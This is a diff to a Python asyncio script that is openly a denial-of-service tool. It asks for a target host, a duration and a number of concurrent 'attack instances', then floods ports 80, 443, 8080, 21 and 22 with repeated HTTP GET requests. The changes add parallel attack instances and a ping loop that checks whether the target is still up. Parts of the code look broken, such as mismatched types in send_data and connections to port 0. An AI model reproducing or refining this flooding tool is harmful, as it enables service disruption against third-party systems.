@@ -1,7 +1,9 @@
 import asyncio
+import os
 import socket
-from typing import Dict, Tuple
+import subprocess
 import time
+from typing import Dict, Tuple
 
 class bcolors:
     HEADER = '\033[95m'
@@ -32,7 +34,7 @@ class CustomTCPProtocol(asyncio.Protocol):
             dest[1].release()
         self.destinations.clear()
 
-    def send_data(self, dest: Tuple[asyncio.Queue, asyncio.Semaphore], data: bytes):
+    def send_data(self, dest: Tuple[str, int], data: bytes):
         if not dest[0].empty():
             dest[1].acquire()
             dest[0].put_nowait(data)
@@ -42,14 +44,16 @@ class CustomTCPProtocol(asyncio.Protocol):
         if dest not in self.destinations:
             self.destinations[dest] = (asyncio.Queue(), asyncio.Semaphore())
 
-async def monitor_status(target: str, duration_seconds: int):
-    end_time = time.time() + duration_seconds
-    while time.time() < end_time:
-        print(f"\r{bcolors.OKBLUE}Monitoring status of {target}...{bcolors.ENDC}", end="")
-        await asyncio.sleep(5)  # Simulate status check
-    print()  # Newline after monitoring
+async def ping_target(target: str):
+    while True:
+        try:
+            output = subprocess.check_output(["ping", "-c", "1", target], stderr=subprocess.STDOUT, universal_newlines=True)
+            print(f"{bcolors.OKBLUE}Ping successful: {output.split()[3]} ms{bcolors.ENDC}")
+        except subprocess.CalledProcessError:
+            print(f"{bcolors.FAIL}Ping failed. Target is not reachable.{bcolors.ENDC}")
+        await asyncio.sleep(5)
 
-async def attack(target: str, duration_minutes: int) -> None:
+async def attack(target: str, duration_minutes: int, attack_count: int) -> None:
     status = {}
     duration_seconds = duration_minutes * 60
 
@@ -58,31 +62,35 @@ async def attack(target: str, duration_minutes: int) -> None:
         status[result] = status.get(result, 0) + 1
 
     loop = asyncio.get_running_loop()
-    transport, protocol = await loop.create_connection(lambda: CustomTCPProtocol(), target, 0)
     
-    try:
-        ports = [80, 443, 8080, 21, 22]
-        for port in ports:
-            print(f"{bcolors.OKBLUE}Sending data to {target}:{port}{bcolors.ENDC}")
-            protocol.add_destination((target, port))
-            transport.write(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
+    tasks = []
+    for _ in range(attack_count):
+        transport, protocol = await loop.create_connection(lambda: CustomTCPProtocol(), target, 0)
 
-        end_time = loop.time() + duration_seconds
-        tasks = []
-        while loop.time() < end_time:
-            for dest in protocol.destinations.keys():
-                for _ in range(10):  # Increase the number of requests sent
-                    task = asyncio.create_task(protocol.send_data(protocol.destinations[dest],
-                        f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode()))
-                    task.add_done_callback(on_task_complete)
-                    tasks.append(task)
-            await asyncio.sleep(0.1)  # Decrease the delay between sending requests
+        try:
+            ports = [80, 443, 8080, 21, 22]
+            for port in ports:
+                print(f"{bcolors.OKBLUE}Sending data to {target}:{port}{bcolors.ENDC}")
+                protocol.add_destination((target, port))
+                transport.write(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
 
-        await asyncio.gather(*tasks)
-        print(f"{bcolors.OKGREEN}Attack completed.{bcolors.ENDC}")
-        print(f"{bcolors.WARNING}Status:{bcolors.ENDC} {status}")
-    finally:
-        transport.close()
+            end_time = loop.time() + duration_seconds
+            while loop.time() < end_time:
+                for dest in protocol.destinations.keys():
+                    for _ in range(10):  # Increase the number of requests sent
+                        task = asyncio.create_task(protocol.send_data(protocol.destinations[dest],
+                            f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode()))
+                        task.add_done_callback(on_task_complete)
+                        tasks.append(task)
+                await asyncio.sleep(0.1)  # Decrease the delay between sending requests
+
+            await asyncio.gather(*tasks)
+            print(f"{bcolors.OKGREEN}Attack instance completed.{bcolors.ENDC}")
+        finally:
+            transport.close()
+
+    print(f"{bcolors.OKGREEN}All attack instances completed.{bcolors.ENDC}")
+    print(f"{bcolors.WARNING}Status:{bcolors.ENDC} {status}")
 
 async def countdown(duration_seconds: int):
     for remaining in range(duration_seconds, 0, -1):
@@ -93,14 +101,16 @@ async def countdown(duration_seconds: int):
     print()  # Newline after countdown
 
 async def main():
+    os.system('clear')  # Clear the terminal
     duration_minutes = int(input(f"{bcolors.HEADER}Enter the duration of the attack in minutes: {bcolors.ENDC}"))
     target = input(f"{bcolors.HEADER}Enter the target IP or domain (e.g. 123.123.123.123 or www.example.com): {bcolors.ENDC}")
-    print(f"{bcolors.OKGREEN}Attacking {target} on ports [80, 443, 8080, 21, 22] for {duration_minutes} minutes...{bcolors.ENDC}")
+    attack_count = int(input(f"{bcolors.HEADER}Enter the number of concurrent attack instances (e.g. 100): {bcolors.ENDC}"))
+    print(f"{bcolors.OKGREEN}Attacking {target} on ports [80, 443, 8080, 21, 22] for {duration_minutes} minutes with {attack_count} concurrent instances...{bcolors.ENDC}")
 
     duration_seconds = duration_minutes * 60
     await asyncio.gather(
-        attack(target, duration_minutes),
-        monitor_status(target, duration_seconds),
+        attack(target, duration_minutes, attack_count),
+        ping_target(target),
         countdown(duration_seconds)
     )
 
